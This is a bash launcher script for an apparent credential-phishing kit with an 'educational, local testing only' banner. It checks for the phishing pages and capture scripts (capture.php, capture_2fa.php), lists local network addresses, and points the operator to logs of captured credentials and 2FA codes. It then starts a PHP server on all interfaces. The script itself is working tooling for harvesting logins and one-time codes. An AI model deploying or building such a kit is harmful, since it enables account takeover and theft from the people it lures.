#!/bin/bash

clear
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║      _        __ _     _                                                   ║
║     (_) ___  / _(_)___| |__                                                ║
║     | |/ __|| |_| / __| '_ \                                               ║
║     | | (__ |  _| \__ \ | | |                                              ║
║     |_|\___||_| |_|___/_| |_|                                              ║
║                                                                           ║
║      EDUCATIONAL PROJECT - LOCAL TESTING ONLY                              ║
║      localhost / 192.168.x.x                                               ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF

echo ""
echo "📁 Working Directory: $(pwd)"
echo ""
echo "🔍 Checking files..."

if [[ -f "index.html" && -f "verify.html" && -f "capture.php" && -f "capture_2fa.php" ]]; then
    echo "   ✓ All required files present"
else
    echo "   ✗ Missing files! Make sure you're in the project root directory"
    exit 1
fi

echo ""
echo "🌐 Network Information:"
echo "   Local educational project addresses:"
echo "     → localhost"
ip -4 addr show | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
    echo "     → $ip"
done

echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
echo "📱 LOCAL ACCESS:"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
echo "   Open the project page from this machine or an authorized test device:"
echo "   http://localhost      (for local testing)"
ip -4 addr show | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
    echo "   http://$ip          (authorized private network only)"
done
echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
echo "📊 MONITORING CAPTURES:"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
echo "   Captured data will be stored in: $(pwd)/creds/"
echo ""
echo "   Monitor in real-time (in another terminal):"
echo "   tail -f $(pwd)/creds/all_credentials.log"
echo "   tail -f $(pwd)/creds/all_2fa_codes.log"
echo ""
echo "   View all captures:"
echo "   ls -lh $(pwd)/creds/"
echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
echo "🚀 Starting PHP Development Server on Port 80..."
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
echo "   Press Ctrl+C to stop the server"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "⚠️  Not running as root. Trying port 8080 instead..."
    echo ""
    echo "   Access via: http://localhost:8080"
    ip -4 addr show | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
        echo "   Private network access: http://$ip:8080"
    done
    echo ""
    php -S 0.0.0.0:8080
else
    echo "   Running on port 80 (requires root)"
    echo ""
    php -S 0.0.0.0:80
fi
